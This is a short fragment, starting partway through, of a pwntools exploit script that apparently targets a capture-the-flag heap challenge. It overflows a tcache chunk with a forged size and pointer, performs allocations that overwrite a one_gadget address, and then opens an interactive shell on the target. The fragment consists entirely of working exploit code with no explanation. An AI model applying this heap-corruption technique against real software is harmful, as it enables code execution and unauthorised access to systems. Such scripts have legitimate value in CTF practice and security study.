...
edit0(0,b'A'*99,0x230,b'Z'*(0x200)+p64(0)+p64(0x71)+p64(chunk))
##overflow in tcache chunk for 8 bytes

alloc0(b'B'*99,0x200,b'B'*99)

alloc0(b'A'*35,0x200,b'B'*99)


edit0(9,b'A'*35+p64(one),0x200,b'B'*99)
gdb.attach(r)
input('wait')
r.sendline(b'0')
r.interactive()
